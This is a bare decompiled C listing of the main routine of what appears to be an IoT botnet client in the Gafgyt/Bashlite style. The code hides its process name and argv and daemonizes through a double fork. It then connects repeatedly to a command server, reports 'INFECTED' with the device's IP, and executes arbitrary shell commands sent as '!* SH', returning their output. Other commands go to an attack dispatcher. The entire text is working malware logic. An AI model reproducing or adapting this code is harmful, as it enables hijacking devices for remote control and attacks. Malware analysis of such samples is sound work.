
void main(undefined4 param_1,char **param_2)

{
  char *pcVar1;
  size_t sVar2;
  long lVar3;
  uint uVar4;
  uint uVar5;
  __pid_t _Var6;
  int iVar7;
  void *pvVar8;
  undefined4 uVar9;
  byte *pbVar10;
  int local_14d0;
  char *local_14c8;
  int local_14c4;
  byte *local_14c0;
  char *local_14b8;
  uint local_14b4;
  byte *local_14ac;
  uint local_14a8;
  undefined4 local_1488 [4];
  undefined4 local_1478;
  int iStack5236;
  byte *local_1470 [10];
  undefined auStack5192 [1024];
  char acStack4168 [4096];
  uint local_48;
  uint local_44;
  uint local_40;
  uint local_3c;
  uint local_38;
  uint local_34;
  undefined4 local_30;
  uint local_2c;
  uint local_28;
  uint local_24;
  undefined4 local_20;
  uint local_1c;
  int local_18;
  
  local_1488[0] = C_465_7399._0_4_;
  local_1488[1] = C_465_7399._4_4_;
  local_1488[2] = C_465_7399._8_4_;
  local_1488[3] = C_465_7399._12_4_;
  local_1478 = C_465_7399._16_4_;
  pcVar1 = *param_2;
  sVar2 = strlen(*param_2);
  strncpy(pcVar1,"",sVar2);
  *param_2 = "";
  lVar3 = rand();
  local_18 = lVar3 % 5;
  prctl(0xf,local_1488[local_18],0,0,0);
  uVar4 = time((time_t *)0x0);
  uVar5 = getpid();
  srandom(uVar4 ^ uVar5);
  uVar4 = time((time_t *)0x0);
  uVar5 = getpid();
  init_rand(uVar4 ^ uVar5);
  getOurIP();
  zprintf("MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",macAddress._0_1_,macAddress._1_1_,macAddress._2_1_,
          macAddress._3_1_,macAddress._4_1_,(undefined)macAddress);
  _Var6 = fork();
  if (_Var6 != 0) {
    waitpid(_Var6,&iStack5236,0);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var6 = fork();
  if (_Var6 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  chdir("/");
  setuid(0);
  seteuid(0);
  signal(0xd,(__sighandler_t)0x1);
  do {
    while (iVar7 = initConnection(), uVar9 = mainCommSock, iVar7 != 0) {
      sleep(5);
    }
    pcVar1 = inet_ntoa((in_addr)ourIP);
    sockprintf(uVar9,"INFECTED %s",pcVar1);
    while (iVar7 = recvLine(mainCommSock,acStack4168,0x1000), iVar7 != -1) {
      local_14a8 = 0;
      while( true ) {
        local_40 = (int)local_14a8 >> 0x1f;
        local_3c = local_14a8;
        local_44 = numpids._4_4_;
        local_48 = numpids._0_4_;
        if ((numpids._0_4_ <= local_40) &&
           ((numpids._0_4_ != local_40 || (numpids._4_4_ <= local_14a8)))) break;
        _Var6 = waitpid(*(__pid_t *)(local_14a8 * 4 + (int)pids),(int *)0x0,1);
        local_14b4 = local_14a8;
        if (0 < _Var6) {
          while( true ) {
            local_14b4 = local_14b4 + 1;
            local_1c = local_14b4;
            local_20 = 0;
            local_24 = numpids._4_4_;
            local_28 = numpids._0_4_;
            if ((numpids._0_4_ == 0) && (numpids._4_4_ <= local_14b4)) break;
            *(undefined4 *)((int)pids + local_14b4 * 4 + -4) =
                 *(undefined4 *)(local_14b4 * 4 + (int)pids);
          }
          *(undefined4 *)((int)pids + local_14b4 * 4 + -4) = 0;
          uVar4 = numpids._4_4_ - 1;
          numpids._0_4_ = (uint)(uVar4 < numpids._4_4_) + (numpids._0_4_ - 1);
          numpids._4_4_ = uVar4;
          pvVar8 = malloc(uVar4 * 4 + 4);
          local_14b4 = 0;
          while( true ) {
            local_2c = local_14b4;
            local_30 = 0;
            local_34 = numpids._4_4_;
            local_38 = numpids._0_4_;
            if ((numpids._0_4_ == 0) && (numpids._4_4_ <= local_14b4)) break;
            *(undefined4 *)(local_14b4 * 4 + (int)pvVar8) =
                 *(undefined4 *)(local_14b4 * 4 + (int)pids);
            local_14b4 = local_14b4 + 1;
          }
          free(pids);
          pids = pvVar8;
        }
        local_14a8 = local_14a8 + 1;
      }
      acStack4168[iVar7] = '\0';
      trim(acStack4168);
      pcVar1 = strstr(acStack4168,"PING");
      if (pcVar1 == acStack4168) {
        sockprintf(mainCommSock,&DAT_00418650);
      }
      else {
        pcVar1 = strstr(acStack4168,"DUP");
        if (pcVar1 == acStack4168) {
                    /* WARNING: Subroutine does not return */
          exit(0);
        }
        if (acStack4168[0] == '!') {
          local_14b8 = acStack4168;
          do {
            local_14b8 = local_14b8 + 1;
            if (*local_14b8 == ' ') break;
          } while (*local_14b8 != '\0');
          if (*local_14b8 != '\0') {
            *local_14b8 = '\0';
            sVar2 = strlen(acStack4168 + 1);
            pbVar10 = (byte *)(acStack4168 + sVar2 + 2);
            while ((sVar2 = strlen((char *)pbVar10), pbVar10[sVar2 - 1] == 10 ||
                   (sVar2 = strlen((char *)pbVar10), local_14ac = pbVar10, pbVar10[sVar2 - 1] == 0xd
                   ))) {
              sVar2 = strlen((char *)pbVar10);
              pbVar10[sVar2 - 1] = 0;
            }
            for (; (*local_14ac != 0x20 && (*local_14ac != 0)); local_14ac = local_14ac + 1) {
            }
            *local_14ac = 0;
            for (local_14c0 = pbVar10; *local_14c0 != 0; local_14c0 = local_14c0 + 1) {
              iVar7 = toupper((uint)*local_14c0);
              *local_14c0 = (byte)iVar7;
            }
            iVar7 = strcmp((char *)pbVar10,"SH");
            if (iVar7 == 0) {
              iVar7 = listFork();
              if (iVar7 == 0) {
                memset(auStack5192,0,0x400);
                szprintf(auStack5192,"%s 2>&1",local_14ac + 1);
                uVar9 = fdpopen(auStack5192,&DAT_00418834);
                while (iVar7 = fdgets(auStack5192,0x400,uVar9), iVar7 != 0) {
                  trim(auStack5192);
                  sockprintf(mainCommSock,&DAT_00418838,auStack5192);
                  memset(auStack5192,0,0x400);
                  sleep(1);
                }
                fdpclose(uVar9);
                    /* WARNING: Subroutine does not return */
                exit(0);
              }
            }
            else {
              local_14c4 = 1;
              local_14c8 = strtok((char *)(local_14ac + 1)," ");
              local_1470[0] = pbVar10;
              while (local_14c8 != (char *)0x0) {
                if (*local_14c8 != '\n') {
                  sVar2 = strlen(local_14c8);
                  pbVar10 = (byte *)malloc(sVar2 + 1);
                  local_1470[local_14c4] = pbVar10;
                  pbVar10 = local_1470[local_14c4];
                  sVar2 = strlen(local_14c8);
                  memset(pbVar10,0,sVar2 + 1);
                  strcpy((char *)local_1470[local_14c4],local_14c8);
                  local_14c4 = local_14c4 + 1;
                }
                local_14c8 = strtok((char *)0x0," ");
              }
              processCmd(local_14c4,local_1470);
              if (1 < local_14c4) {
                for (local_14d0 = 1; local_14d0 < local_14c4; local_14d0 = local_14d0 + 1) {
                  free(local_1470[local_14d0]);
                }
              }
            }
          }
        }
      }
    }
    puts("Link closed by server.");
  } while( true );
}

